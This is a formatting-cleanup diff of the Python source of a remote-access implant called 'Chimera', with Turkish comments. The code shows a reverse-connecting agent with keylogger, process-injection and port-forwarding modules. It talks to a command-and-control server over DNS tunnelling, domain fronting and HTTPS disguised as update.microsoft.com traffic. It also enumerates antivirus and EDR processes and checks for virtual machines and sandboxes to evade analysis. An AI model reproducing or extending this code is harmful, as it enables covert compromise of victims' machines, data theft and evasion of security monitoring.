         """Hedef host üzerinde TCP port taraması yapar.
 
         Sadece açık portları raporlar. Servis ismi tahmini yapmaz.
@@ -1224,9 +1292,10 @@ class NetworkScanner:
 # İletişim Kanalları (Communication Channels)
 # ============================================================
 
+
 class CommChannel:
     """Tüm iletişim kanalları için soyut temel sınıf.
-    
+
     Her kanal bu sınıftan türetilir ve aşağıdaki metodları
     uygulamak zorundadır:
       - connect(host, port) -> bool
@@ -1238,11 +1307,11 @@ class CommChannel:
 
     def connect(self, host: str, port: int) -> bool:
         """Handler'a bağlantı kurar.
-        
+
         Args:
             host: Handler IP/hostname.
             port: Handler port numarası.
-            
+
         Returns:
             bool: Bağlantı başarılı ise True.
         """
@@ -1250,7 +1319,7 @@ class CommChannel:
 
     def send_data(self, data: str):
         """Handler'a veri gönderir.
-        
+
         Args:
             data: Gönderilecek UTF-8 string veri.
         """
@@ -1258,7 +1327,7 @@ class CommChannel:
 
     def recv_data(self) -> str:
         """Handler'dan veri alır.
-        
+
         Returns:
             str: Alınan veri. Bağlantı kopmuşsa boş string.
         """
@@ -1270,7 +1339,7 @@ class CommChannel:
 
     def is_alive(self) -> bool:
         """Kanalın aktif olup olmadığını kontrol eder.
-        
+
         Returns:
             bool: Kanal aktif ise True.
         """
@@ -1284,7 +1353,7 @@ class CommChannel:
 
 class HTTPSChannel(CommChannel):
     """HTTPS (TCP + SSL/TLS + HTTP Framing) iletişim kanalı.
-    
+
     Mevcut Chimera iletişim protokolünü encapsulate eder:
     - TCP soket oluştur
     - SSL/TLS ile sarmala (self-signed sertifika kabul)
@@ -1318,9 +1387,11 @@ class HTTPSChannel(CommChannel):
             return
         try:
             encoded_body = data.encode("utf-8")
-            user_agent = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-                          "AppleWebKit/537.36 (KHTML, like Gecko) "
-                          "Chrome/91.0.4472.124 Safari/537.36")
+            user_agent = (
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                "AppleWebKit/537.36 (KHTML, like Gecko) "
+                "Chrome/91.0.4472.124 Safari/537.36"
+            )
             request = (
                 b"POST /api/v1/sync HTTP/1.1\r\n"
                 b"Host: update.microsoft.com\r\n"
@@ -1346,14 +1417,12 @@ class HTTPSChannel(CommChannel):
                     return ""
                 header_buffer += chunk
 
-            headers = header_buffer.decode('utf-8', errors='ignore')
+            headers = header_buffer.decode("utf-8", errors="ignore")
             content_length = 0
-            for line in headers.split('\r\n'):
-                if line.lower().startswith('content-length:'):
-                    try:
-                        content_length = int(line.split(':')[1].strip())
-                    except Exception:
-                        pass
+            for line in headers.split("\r\n"):
+                if line.lower().startswith("content-length:"):
+                    with contextlib.suppress(Exception):
+                        content_length = int(line.split(":")[1].strip())
 
             body = b""
             while len(body) < content_length:
@@ -1369,10 +1438,8 @@ class HTTPSChannel(CommChannel):
     def close(self):
         """SSL soketini kapatır."""
         if self.sock:
-            try:
+            with contextlib.suppress(Exception):
                 self.sock.close()
-            except Exception:
-                pass
             self.sock = None
 
     def is_alive(self) -> bool:
@@ -1388,14 +1455,14 @@ class HTTPSChannel(CommChannel):
 
 class DNSTunnelChannel(CommChannel):
     """DNS tünelleme iletişim kanalı.
-    
+
     DNS sorguları üzerinden veri iletimi sağlar.
     - Gönderim: Veri → base32 encode → subdomain olarak DNS sorgusu
     - Alım: DNS TXT kayıtlarından base64 decode
-    
+
     Sadece Python stdlib kullanır (socket UDP).
     Düşük bant genişliği (~200 byte/sorgu) ama stealth.
-    
+
     Args:
         dns_domain: C2 DNS domain'i (ör: c2.example.com)
         dns_server: DNS çözümleyici IP (varsayılan: 8.8.8.8)
@@ -1403,9 +1470,9 @@ class DNSTunnelChannel(CommChannel):
 
     # DNS Paket Sabitleri
     DNS_PORT = 53
-    MAX_LABEL_LEN = 63      # RFC 1035: max label uzunluğu
+    MAX_LABEL_LEN = 63  # RFC 1035: max label uzunluğu
     MAX_SUBDOMAIN_LEN = 180  # Toplam subdomain uzunluk sınırı
-    CHUNK_SIZE = 110          # Her DNS sorgusunda gönderilecek byte
+    CHUNK_SIZE = 110  # Her DNS sorgusunda gönderilecek byte
 
     def __init__(self, dns_domain: str = "", dns_server: str = "8.8.8.8"):
         self.dns_domain = dns_domain
@@ -1425,46 +1492,48 @@ class DNSTunnelChannel(CommChannel):
     def _base32_encode(data: bytes) -> str:
         """DNS-safe base32 encoding (padding olmadan, küçük harf)."""
         import base64
-        return base64.b32encode(data).decode('ascii').rstrip('=').lower()
+
+        return base64.b32encode(data).decode("ascii").rstrip("=").lower()
 
     @staticmethod
     def _base32_decode(data: str) -> bytes:
         """DNS-safe base32 decoding."""
         import base64
+
         # Padding ekle
         padding = (8 - len(data) % 8) % 8
-        return base64.b32decode(data.upper() + '=' * padding)
+        return base64.b32decode(data.upper() + "=" * padding)
 
     def _build_dns_query(self, qname: str, qtype: int = 16) -> bytes:
         """DNS sorgu paketi oluşturur.
-        
+
         Args:
             qname: Sorgulanacak domain adı.
             qtype: Sorgu tipi (16 = TXT, 1 = A, 5 = CNAME).
-            
+
         Returns:
             bytes: DNS sorgu paketi.
         """
         txn_id = self._next_txn_id()
         # Header: ID(2) + Flags(2) + QDCOUNT(2) + ANCOUNT(2) + NSCOUNT(2) + ARCOUNT(2)
-        header = struct.pack('>HHHHHH', txn_id, 0x0100, 1, 0, 0, 0)
+        header = struct.pack(">HHHHHH", txn_id, 0x0100, 1, 0, 0, 0)
 
         # Question section: QNAME + QTYPE(2) + QCLASS(2)
         qname_bytes = b""
-        for label in qname.split('.'):
-            label_enc = label.encode('ascii')
-            qname_bytes += struct.pack('B', len(label_enc)) + label_enc
-        qname_bytes += b'\x00'
+        for label in qname.split("."):
+            label_enc = label.encode("ascii")
+            qname_bytes += struct.pack("B", len(label_enc)) + label_enc
+        qname_bytes += b"\x00"
 
-        question = qname_bytes + struct.pack('>HH', qtype, 1)  # IN class
+        question = qname_bytes + struct.pack(">HH", qtype, 1)  # IN class
         return header + question
 
     def _parse_dns_response(self, data: bytes) -> str:
         """DNS cevap paketinden TXT kayıt verisini çıkarır.
-        
+
         Args:
             data: Ham DNS cevap paketi.
-            
+
         Returns:
             str: TXT kayıt verisi veya boş string.
         """
@@ -1472,7 +1541,7 @@ class DNSTunnelChannel(CommChannel):
             return ""
 
         # Header parse
-        ancount = struct.unpack('>H', data[6:8])[0]
+        ancount = struct.unpack(">H", data[6:8])[0]
         if ancount == 0:
             return ""
 
@@ -1505,13 +1574,15 @@ class DNSTunnelChannel(CommChannel):
             if pos + 10 > len(data):
                 break
 
-            rtype = struct.unpack('>H', data[pos:pos+2])[0]
-            rdlen = struct.unpack('>H', data[pos+8:pos+10])[0]
+            rtype = struct.unpack(">H", data[pos : pos + 2])[0]
+            rdlen = struct.unpack(">H", data[pos + 8 : pos + 10])[0]
             pos += 10
 
             if rtype == 16 and rdlen > 1:  # TXT
                 txt_len = data[pos]
-                txt_data = data[pos+1:pos+1+txt_len].decode('utf-8', errors='ignore')
+                txt_data = data[pos + 1 : pos + 1 + txt_len].decode(
+                    "utf-8", errors="ignore"
+                )
                 break
 
             pos += rdlen
@@ -1520,7 +1591,7 @@ class DNSTunnelChannel(CommChannel):
 
     def connect(self, host: str, port: int) -> bool:
         """DNS tünel kanalını başlatır.
-        
+
         UDP soket oluşturur ve C2'ye kayıt (register) sorgusu gönderir.
         """
         if not self.dns_domain:
@@ -1544,7 +1615,7 @@ class DNSTunnelChannel(CommChannel):
                 if result and "OK" in result.upper():
                     self._connected = True
                     return True
-            except socket.timeout:
+            except TimeoutError:
                 # Timeout olsa bile bağlantı kurulmuş say (stealth mod)
                 self._connected = True
                 return True
@@ -1559,11 +1630,11 @@ class DNSTunnelChannel(CommChannel):
         if not self.sock or not self._connected:
             return
         try:
-            raw = data.encode('utf-8')
+            raw = data.encode("utf-8")
             # Veriyi chunk'lara böl
             chunks = []
             for i in range(0, len(raw), self.CHUNK_SIZE):
-                chunks.append(raw[i:i + self.CHUNK_SIZE])
+                chunks.append(raw[i : i + self.CHUNK_SIZE])
 
             total = len(chunks)
             for idx, chunk in enumerate(chunks):
@@ -1571,10 +1642,10 @@ class DNSTunnelChannel(CommChannel):
                 # Subdomain'leri max label uzunluğuna göre böl
                 labels = []
                 for j in range(0, len(encoded), self.MAX_LABEL_LEN):
-                    labels.append(encoded[j:j + self.MAX_LABEL_LEN])
+                    labels.append(encoded[j : j + self.MAX_LABEL_LEN])
 
                 # Format: <data_labels>.s<seq>t<total>.<dns_domain>
-                subdomain = '.'.join(labels)
+                subdomain = ".".join(labels)
                 qname = f"{subdomain}.s{idx}t{total}.{self.dns_domain}"
                 query = self._build_dns_query(qname, qtype=1)  # A record sorgusu
                 self.sock.sendto(query, (self.dns_server, self.DNS_PORT))
@@ -1613,25 +1684,27 @@ class DNSTunnelChannel(CommChannel):
                     if txt_data.startswith("COMPLETE:"):
                         # Tek parça cevap
                         import base64
+
                         payload = txt_data[9:]  # "COMPLETE:" prefix'ini kaldır
                         try:
-                            return base64.b64decode(payload).decode('utf-8')
+                            return base64.b64decode(payload).decode("utf-8")
                         except Exception:
                             return payload
-                    
+
                     # Sonraki parçayı iste
                     next_qname = f"next.{len(collected)}.{self.dns_domain}"
                     next_query = self._build_dns_query(next_qname, qtype=16)
                     self.sock.sendto(next_query, (self.dns_server, self.DNS_PORT))
 
-            except socket.timeout:
+            except TimeoutError:
                 pass
 
             if collected:
                 import base64
-                full_data = ''.join(collected)
+
+                full_data = "".join(collected)
                 try:
-                    return base64.b64decode(full_data).decode('utf-8')
+                    return base64.b64decode(full_data).decode("utf-8")
                 except Exception:
                     return full_data
 
@@ -1643,10 +1716,8 @@ class DNSTunnelChannel(CommChannel):
         """UDP soketini kapatır."""
         self._connected = False
         if self.sock:
-            try:
+            with contextlib.suppress(Exception):
                 self.sock.close()
-            except Exception:
-                pass
             self.sock = None
 
     def is_alive(self) -> bool:
@@ -1656,13 +1727,13 @@ class DNSTunnelChannel(CommChannel):
 
 class DomainFrontingChannel(CommChannel):
     """Domain Fronting iletişim kanalı.
-    
+
     CDN üzerinden gizli HTTPS iletişimi:
     - TLS SNI (Server Name Indication): CDN hostname'i (ör: cdn.cloudflare.com)
     - HTTP Host header: Gerçek C2 sunucusu (ör: c2.example.com)
-    
+
     Ağ trafiğinde sadece CDN adresi görünür, gerçek C2 hedefi gizlenir.
-    
+
     Args:
         fronting_domain: CDN hostname (SNI olarak kullanılır)
     """
@@ -1675,7 +1746,7 @@ class DomainFrontingChannel(CommChannel):
 
     def connect(self, host: str, port: int) -> bool:
         """Domain fronting ile HTTPS bağlantısı kurar.
-        
+
         SNI = fronting_domain (CDN), HTTP Host = host (gerçek C2).
         """
         if not self.fronting_domain:
@@ -1692,7 +1763,9 @@ class DomainFrontingChannel(CommChannel):
             context.verify_mode = ssl.CERT_NONE
 
             # SNI olarak CDN hostname kullan
-            self.sock = context.wrap_socket(raw_sock, server_hostname=self.fronting_domain)
+            self.sock = context.wrap_socket(
+                raw_sock, server_hostname=self.fronting_domain
+            )
             # CDN'in 443 portuna bağlan
             self.sock.connect((self.fronting_domain, 443))
             self.sock.settimeout(None)
@@ -1703,16 +1776,18 @@ class DomainFrontingChannel(CommChannel):
 
     def send_data(self, data: str):
         """Domain fronting ile veri gönderir.
-        
+
         Host header'da gerçek C2 adresi kullanılır.
         """
         if not self.sock:
             return
         try:
             encoded_body = data.encode("utf-8")
-            user_agent = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-                          "AppleWebKit/537.36 (KHTML, like Gecko) "
-                          "Chrome/120.0.0.0 Safari/537.36")
+            user_agent = (
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                "AppleWebKit/537.36 (KHTML, like Gecko) "
+                "Chrome/120.0.0.0 Safari/537.36"
+            )
             # Host header: gerçek C2 sunucu (CDN bunu arka sunucuya yönlendirir)
             request = (
                 b"POST /api/v1/sync HTTP/1.1\r\n"
@@ -1740,14 +1815,12 @@ class DomainFrontingChannel(CommChannel):
                     return ""
                 header_buffer += chunk
 
-            headers = header_buffer.decode('utf-8', errors='ignore')
+            headers = header_buffer.decode("utf-8", errors="ignore")
             content_length = 0
-            for line in headers.split('\r\n'):
-                if line.lower().startswith('content-length:'):
-                    try:
-                        content_length = int(line.split(':')[1].strip())
-                    except Exception:
-                        pass
+            for line in headers.split("\r\n"):
+                if line.lower().startswith("content-length:"):
+                    with contextlib.suppress(Exception):
+                        content_length = int(line.split(":")[1].strip())
 
             body = b""
             while len(body) < content_length:
@@ -1763,10 +1836,8 @@ class DomainFrontingChannel(CommChannel):
     def close(self):
         """SSL soketini kapatır."""
         if self.sock:
-            try:
+            with contextlib.suppress(Exception):
                 self.sock.close()
-            except Exception:
-                pass
             self.sock = None
 
     def is_alive(self) -> bool:
@@ -1782,11 +1853,11 @@ class DomainFrontingChannel(CommChannel):
 
 class ChannelManager:
     """İletişim kanalı yöneticisi.
-    
+
     Birden fazla iletişim kanalını öncelik sırasına göre yönetir.
     Ana kanal başarısız olduğunda otomatik olarak alternatif kanala
     geçiş (fallback) yapar.
-    
+
     Kullanım:
         manager = ChannelManager()
         manager.add_channel(HTTPSChannel(), priority=1)
@@ -1796,14 +1867,14 @@ class ChannelManager:
     """
 
     def __init__(self):
-        self._channels = []       # [(priority, channel), ...]
+        self._channels = []  # [(priority, channel), ...]
         self.active_channel = None
         self._host = ""
         self._port = 0
 
     def add_channel(self, channel: CommChannel, priority: int = 10):
         """Yeni bir iletişim kanalı ekler.
-        
+
         Args:
             channel: CommChannel türetilmiş kanal nesnesi.
             priority: Öncelik değeri (düşük = yüksek öncelik).
@@ -1813,9 +1884,9 @@ class ChannelManager:
 
     def connect(self, host: str, port: int) -> bool:
         """Kanalları öncelik sırasına göre dener.
-        
+
         İlk başarılı bağlantı aktif kanal olarak seçilir.
-        
+
         Returns:
             bool: Herhangi bir kanal bağlandıysa True.
         """
@@ -1834,18 +1905,16 @@ class ChannelManager:
 
     def fallback(self) -> bool:
         """Aktif kanal başarısız olduğunda alternatif kanala geçer.
-        
+
         Mevcut kanalı kapatır ve sıradaki kanala bağlanmayı dener.
-        
+
         Returns:
             bool: Alternatif kanala geçiş başarılıysa True.
         """
         # Mevcut kanalı kapat
         if self.active_channel:
-            try:
+            with contextlib.suppress(Exception):
                 self.active_channel.close()
-            except Exception:
-                pass
 
         current_idx = -1
         if self.active_channel:
@@ -1855,8 +1924,9 @@ class ChannelManager:
                     break
 
         # Sıradaki kanallardan başla, sonra başa dön
-        order = list(range(current_idx + 1, len(self._channels))) + \
-                list(range(0, current_idx + 1))
+        order = list(range(current_idx + 1, len(self._channels))) + list(
+            range(0, current_idx + 1)
+        )
 
         for idx in order:
             _, channel = self._channels[idx]
@@ -1894,19 +1964,15 @@ class ChannelManager:
     def close(self):
         """Aktif kanalı kapatır."""
         if self.active_channel:
-            try:
+            with contextlib.suppress(Exception):
                 self.active_channel.close()
-            except Exception:
-                pass
             self.active_channel = None
 
     def close_all(self):
         """Tüm kanalları kapatır."""
         for _, channel in self._channels:
-            try:
+            with contextlib.suppress(Exception):
                 channel.close()
-            except Exception:
-                pass
         self.active_channel = None
 
     def is_alive(self) -> bool:
@@ -1922,8 +1988,8 @@ class ChannelManager:
             return self.active_channel.name
         return "None"
 
-class ChimeraAgent:
 
+class ChimeraAgent:
     """Chimera Core Agent - Temel reverse TCP ajanı."""
 
     def __init__(self, host: str, port: int):
@@ -1932,11 +1998,11 @@ class ChimeraAgent:
         self.sock = None
         self.running = True
         self.loaded_modules = {}  # Yüklü modülleri saklar: {name: module_obj}
-        self.keylogger      = Keylogger()          # Keylogger modülü
-        self.clipboard      = ClipboardManager()    # Clipboard modülü
-        self.injector       = ProcessInjector()     # Process Injection modülü
-        self.port_forwarder = PortForwarder()       # Port Forwarding modülü
-        self.net_scanner    = NetworkScanner()      # Network Scanner modülü
+        self.keylogger = Keylogger()  # Keylogger modülü
+        self.clipboard = ClipboardManager()  # Clipboard modülü
+        self.injector = ProcessInjector()  # Process Injection modülü
+        self.port_forwarder = PortForwarder()  # Port Forwarding modülü
+        self.net_scanner = NetworkScanner()  # Network Scanner modülü
 
         # İletişim Kanalı Yöneticisi
         self.channel_manager = ChannelManager()
@@ -1962,7 +2028,9 @@ class ChimeraAgent:
             self.channel_manager.add_channel(DNSTunnelChannel(dns_domain), priority=1)
             self.channel_manager.add_channel(HTTPSChannel(), priority=2)  # Fallback
         elif channel_type == "fronting":
-            fronting = FRONTING_DOMAIN if FRONTING_DOMAIN != "{{FRONTING_DOMAIN}}" else ""
+            fronting = (
+                FRONTING_DOMAIN if FRONTING_DOMAIN != "{{FRONTING_DOMAIN}}" else ""
+            )
             self.channel_manager.add_channel(
                 DomainFrontingChannel(fronting), priority=1
             )
@@ -1976,46 +2044,46 @@ class ChimeraAgent:
     # --------------------------------------------------------
     def connect(self) -> bool:
         """Handler'a bağlantı kurar (ChannelManager üzerinden).
-        
+
         Konfigüre edilmiş kanalları öncelik sırasına göre dener.
-        
+
         Returns:
             bool: Bağlantı başarılı ise True.
         """
         result = self.channel_manager.connect(self.host, self.port)
         # Geriye uyumluluk: self.sock referansını güncelle
         if result and self.channel_manager.active_channel:
-            self.sock = getattr(self.channel_manager.active_channel, 'sock', None)
+            self.sock = getattr(self.channel_manager.active_channel, "sock", None)
         else:
             self.sock = None
         return result
 
     def reconnect(self) -> bool:
         """Bağlantı koptuğunda yeniden bağlanmayı dener.
-        
+
         Önce fallback (alternatif kanala geçiş) dener,
         başarısız olursa delay ile connect döngüsüne girer.
-        
+
         Returns:
             bool: Yeniden bağlantı başarılı ise True.
         """
         self.close_socket()
-        
+
         # Önce fallback dene (alternatif kanal)
         if self.channel_manager.fallback():
-            self.sock = getattr(self.channel_manager.active_channel, 'sock', None)
+            self.sock = getattr(self.channel_manager.active_channel, "sock", None)
             self.send_sysinfo()
             return True
-        
+
         # Fallback başarısız, normal reconnect döngüsü
         attempts = 0
         while self.running:
             attempts += 1
             if MAX_RECONNECT != -1 and attempts > MAX_RECONNECT:
                 return False
-            
+
             self._sleep_obfuscated(RECONNECT_DELAY)
-            
+
             if self.connect():
                 self.send_sysinfo()
                 return True
@@ -2039,10 +2107,10 @@ class ChimeraAgent:
 
     def _recv_exact(self, n: int) -> bytes:
         """Tam olarak n byte veri okur.
-        
+
         Args:
             n: Okunacak byte sayısı.
-            
+
         Returns:
             bytes: Okunan veri veya None.
         """
@@ -2061,13 +2129,13 @@ class ChimeraAgent:
         """Sistem bilgisini toplayıp handler'a gönderir."""
         try:
             uname = platform.uname()
-            
+
             # Kullanıcı adı
             try:
                 username = os.getlogin()
             except Exception:
                 username = os.environ.get("USER", os.environ.get("USERNAME", "unknown"))
-            
+
             # Sistem bilgisi formatı
             info_parts = [
                 f"OS: {uname.system} {uname.release}",
@@ -2075,7 +2143,7 @@ class ChimeraAgent:
                 f"User: {username}",
                 f"PID: {os.getpid()}",
                 f"Arch: {uname.machine}",
-                f"Python: {platform.python_version()}"
+                f"Python: {platform.python_version()}",
             ]
             info = " | ".join(info_parts)
             self.send_data(info)
@@ -2084,7 +2152,7 @@ class ChimeraAgent:
 
     def get_detailed_sysinfo(self) -> str:
         """Detaylı sistem bilgisi toplar ve formatlanmış string olarak döner.
-        
+
         Returns:
             str: Formatlanmış sistem bilgileri
         """
@@ -2092,7 +2160,7 @@ class ChimeraAgent:
         output.append("=" * 60)
         output.append("DETAYLI SİSTEM BİLGİSİ")
         output.append("=" * 60)
-        
+
         try:
             # 1. Temel Sistem Bilgileri
             uname = platform.uname()
@@ -2102,38 +2170,41 @@ class ChimeraAgent:
             output.append(f"    Platform     : {uname.version}")
             output.append(f"    Mimari       : {uname.machine}")
             output.append(f"    Hostname     : {uname.node}")
-            
+
             # 2. Kullanıcı Bilgileri
             try:
                 username = os.getlogin()
             except Exception:
                 username = os.environ.get("USER", os.environ.get("USERNAME", "unknown"))
-            
+
             output.append("\n[+] Kullanıcı Bilgileri:")
             output.append(f"    Kullanıcı    : {username}")
             output.append(f"    Python       : {platform.python_version()}")
             output.append(f"    PID          : {os.getpid()}")
             output.append(f"    Çalışma Dizini: {os.getcwd()}")
-            
+
             # 3. Yetki Seviyesi
             output.append("\n[+] Yetki Seviyesi:")
             if sys.platform == "win32":
                 try:
                     import ctypes
+
                     is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-                    output.append(f"    Administrator: {'Evet' if is_admin else 'Hayır'}")
+                    output.append(
+                        f"    Administrator: {'Evet' if is_admin else 'Hayır'}"
+                    )
                 except Exception:
-                    output.append(f"    Administrator: Tespit Edilemedi")
+                    output.append("    Administrator: Tespit Edilemedi")
             else:
                 # Unix/Linux sistemler
-                is_root = os.geteuid() == 0 if hasattr(os, 'geteuid') else False
+                is_root = os.geteuid() == 0 if hasattr(os, "geteuid") else False
                 output.append(f"    Root/Sudo    : {'Evet' if is_root else 'Hayır'}")
                 try:
                     output.append(f"    UID          : {os.getuid()}")
                     output.append(f"    GID          : {os.getgid()}")
                 except Exception:
                     pass
-            
+
             # 4. IP Adresleri
             output.append("\n[+] Ağ Bilgileri (IP Adresleri):")
             ip_list = self._get_ip_addresses()
@@ -2142,27 +2213,27 @@ class ChimeraAgent:
                     output.append(f"    {ip_info}")
             else:
                 output.append("    IP adresi bulunamadı")
-            
+
             # 5. Çalışan Process Listesi (İlk 30 process)
             output.append("\n[+] Çalışan Process'ler (İlk 30):")
             processes = self._get_running_processes()
             if processes:
                 output.append(f"    {'PID':<8} {'İsim':<30}")
-                output.append(f"    {'-'*8} {'-'*30}")
+                output.append(f"    {'-' * 8} {'-' * 30}")
                 for proc in processes[:30]:
                     output.append(f"    {proc}")
             else:
                 output.append("    Process listesi alınamadı")
-            
+
         except Exception as e:
-            output.append(f"\n[!] Hata: {str(e)}")
-        
+            output.append(f"\n[!] Hata: {e!s}")
+
         output.append("\n" + "=" * 60)
         return "\n".join(output)
-    
+
     def _get_ip_addresses(self) -> list:
         """Sistemdeki tüm IP adreslerini toplar.
-        
+
         Returns:
             list: IP adresi bilgileri
         """
@@ -2170,16 +2241,19 @@ class ChimeraAgent:
         try:
             if sys.platform == "win32":
                 # Windows için ipconfig çıktısı parse et
-                result = subprocess.check_output("ipconfig", shell=True, stderr=subprocess.DEVNULL)
-                output = result.decode('cp1254', errors='ignore')
-                
+                result = subprocess.check_output(
+                    "ipconfig", shell=True, stderr=subprocess.DEVNULL
+                )
+                output = result.decode("cp1254", errors="ignore")
+
                 import re
+
                 ipv4_pattern = r"IPv4.*?: ([\d\.]+)"
                 ipv6_pattern = r"IPv6.*?: ([a-fA-F0-9:]+)"
-                
+
                 ipv4_matches = re.findall(ipv4_pattern, output)
                 ipv6_matches = re.findall(ipv6_pattern, output)
-                
+
                 for ip in ipv4_matches:
                     ip_list.append(f"IPv4: {ip}")
                 for ip in ipv6_matches:
@@ -2187,22 +2261,27 @@ class ChimeraAgent:
             else:
                 # Linux/MacOS için ifconfig veya ip addr
                 try:
-                    result = subprocess.check_output("ip addr show", shell=True, stderr=subprocess.DEVNULL)
-                    output = result.decode('utf-8')
+                    result = subprocess.check_output(
+                        "ip addr show", shell=True, stderr=subprocess.DEVNULL
+                    )
+                    output = result.decode("utf-8")
                 except Exception:
                     try:
-                        result = subprocess.check_output("ifconfig", shell=True, stderr=subprocess.DEVNULL)
-                        output = result.decode('utf-8')
+                        result = subprocess.check_output(
+                            "ifconfig", shell=True, stderr=subprocess.DEVNULL
+                        )
+                        output = result.decode("utf-8")
                     except Exception:
                         return ip_list
-                
+
                 import re
+
                 ipv4_pattern = r"inet (?:addr:)?([\d\.]+)"
                 ipv6_pattern = r"inet6 (?:addr:)?([a-fA-F0-9:]+)"
-                
+
                 ipv4_matches = re.findall(ipv4_pattern, output)
                 ipv6_matches = re.findall(ipv6_pattern, output)
-                
+
                 for ip in ipv4_matches:
                     if ip != "127.0.0.1":  # Loopback'i atla
                         ip_list.append(f"IPv4: {ip}")
@@ -2211,12 +2290,12 @@ class ChimeraAgent:
                         ip_list.append(f"IPv6: {ip}")
         except Exception:
             pass
-        
+
         return ip_list if ip_list else ["IP adresi tespit edilemedi"]
-    
+
     def _get_running_processes(self) -> list:
         """Çalışan process listesini toplar.
-        
+
         Returns:
             list: Process bilgileri (PID ve isim)
         """
@@ -2224,10 +2303,12 @@ class ChimeraAgent:
         try:
             if sys.platform == "win32":
                 # Windows için tasklist
-                result = subprocess.check_output("tasklist", shell=True, stderr=subprocess.DEVNULL)
-                output = result.decode('cp1254', errors='ignore')
-                
-                lines = output.split('\n')[3:]  # Header'ı atla
+                result = subprocess.check_output(
+                    "tasklist", shell=True, stderr=subprocess.DEVNULL
+                )
+                output = result.decode("cp1254", errors="ignore")
+
+                lines = output.split("\n")[3:]  # Header'ı atla
                 for line in lines:
                     if line.strip():
                         parts = line.split()
@@ -2237,10 +2318,12 @@ class ChimeraAgent:
                             processes.append(f"{pid:<8} {name:<30}")
             else:
                 # Linux/MacOS için ps
-                result = subprocess.check_output("ps aux", shell=True, stderr=subprocess.DEVNULL)
-                output = result.decode('utf-8', errors='ignore')
-                
-                lines = output.split('\n')[1:]  # Header'ı atla
+                result = subprocess.check_output(
+                    "ps aux", shell=True, stderr=subprocess.DEVNULL
+                )
+                output = result.decode("utf-8", errors="ignore")
+
+                lines = output.split("\n")[1:]  # Header'ı atla
                 for line in lines:
                     if line.strip():
                         parts = line.split()
@@ -2251,21 +2334,17 @@ class ChimeraAgent:
                             processes.append(f"{pid:<8} {name:<30}")
         except Exception:
             pass
-        
+
         return processes
 
     def detect_security_products(self) -> dict:
         """Sistemdeki antivirüs ve EDR ürünlerini tespit eder.
-        
+
         Returns:
             dict: Tespit edilen güvenlik ürünleri ve detayları
         """
-        result = {
-            "detected": [],
-            "suspicious_processes": [],
-            "total_av_processes": 0
-        }
-        
+        result = {"detected": [], "suspicious_processes": [], "total_av_processes": 0}
+
         # Bilinen AV/EDR process isimleri (küçük harf)
         known_security_products = {
             # Antivirüs
@@ -2290,7 +2369,6 @@ class ChimeraAgent:
             "mbamservice.exe": "Malwarebytes",
             "tmbmsrv.exe": "Trend Micro",
             "pccntmon.exe": "Trend Micro",
-            
             # EDR (Endpoint Detection and Response)
             "csfalconservice.exe": "CrowdStrike Falcon",
             "csagent.exe": "CrowdStrike",
@@ -2310,21 +2388,22 @@ class ChimeraAgent:
             "elastic": "Elastic EDR",
             "osquery": "osquery",
             "wazuh": "Wazuh",
-            
             # Linux/MacOS AV
             "clamav": "ClamAV",
             "sophos": "Sophos",
             "eset_daemon": "ESET",
-            "avast": "Avast"
+            "avast": "Avast",
         }
-        
+
         try:
             # Process listesini al
             processes = self._get_running_processes()
-            
+
             for proc_line in processes:
-                proc_name = proc_line.split()[1].lower() if len(proc_line.split()) > 1 else ""
-                
+                proc_name = (
+                    proc_line.split()[1].lower() if len(proc_line.split()) > 1 else ""
+                )
+
                 # Bilinen ürünlerle karşılaştır
                 for known_proc, product_name in known_security_products.items():
                     if known_proc in proc_name:
@@ -2333,44 +2412,57 @@ class ChimeraAgent:
                             result["suspicious_processes"].append(proc_line.strip())
                             result["total_av_processes"] += 1
                         break
-                
+
                 # Genel güvenlik yazılımı kalıpları
-                security_keywords = ["antivirus", "antimalware", "defender", "security", 
-                                   "edr", "xdr", "firewall", "threat", "protection"]
+                security_keywords = [
+                    "antivirus",
+                    "antimalware",
+                    "defender",
+                    "security",
+                    "edr",
+                    "xdr",
+                    "firewall",
+                    "threat",
+                    "protection",
+                ]
                 if any(keyword in proc_name for keyword in security_keywords):
                     if proc_line.strip() not in result["suspicious_processes"]:
                         result["suspicious_processes"].append(proc_line.strip())
-                        
+
         except Exception:
             pass
-        
+
         return result
-    
+
     def detect_virtualization(self) -> dict:
         """Sanal makine veya sandbox ortamını tespit eder.
-        
+
         Returns:
             dict: Sanallaştırma tespit sonuçları
         """
         result = {
             "is_virtualized": False,
             "vm_indicators": [],
-            "confidence": "low"  # low, medium, high
+            "confidence": "low",  # low, medium, high
         }
-        
+
         indicators_found = 0
-        
+
         try:
             # 1. DMI/SMBIOS kontrolü (Windows/Linux)
             if sys.platform == "win32":
                 # Windows: WMIC ile kontrol
                 try:
-                    output = subprocess.check_output(
-                        "wmic computersystem get manufacturer,model",
-                        shell=True,
-                        stderr=subprocess.DEVNULL
-                    ).decode('cp1254', errors='ignore').lower()
-                    
+                    output = (
+                        subprocess.check_output(
+                            "wmic computersystem get manufacturer,model",
+                            shell=True,
+                            stderr=subprocess.DEVNULL,
+                        )
+                        .decode("cp1254", errors="ignore")
+                        .lower()
+                    )
+
                     vm_vendors = {
                         "vmware": "VMware",
                         "virtualbox": "VirtualBox",
@@ -2379,73 +2471,96 @@ class ChimeraAgent:
                         "xen": "Xen",
                         "microsoft": "Hyper-V",
                         "parallels": "Parallels",
-                        "virtual": "Generic VM"
+                        "virtual": "Generic VM",
                     }
-                    
+
                     for vendor, name in vm_vendors.items():
                         if vendor in output:
                             result["vm_indicators"].append(f"Manufacturer: {name}")
                             indicators_found += 1
                 except Exception:
                     pass
-                
+
                 # BIOS Version kontrolü
                 try:
-                    output = subprocess.check_output(
-                        "wmic bios get version",
-                        shell=True,
-                        stderr=subprocess.DEVNULL
-                    ).decode('cp1254', errors='ignore').lower()
-                    
-                    if any(vm in output for vm in ["vbox", "vmware", "qemu", "virtual"]):
+                    output = (
+                        subprocess.check_output(
+                            "wmic bios get version",
+                            shell=True,
+                            stderr=subprocess.DEVNULL,
+                        )
+                        .decode("cp1254", errors="ignore")
+                        .lower()
+                    )
+
+                    if any(
+                        vm in output for vm in ["vbox", "vmware", "qemu", "virtual"]
+                    ):
                         result["vm_indicators"].append("BIOS: Virtual BIOS detected")
                         indicators_found += 1
                 except Exception:
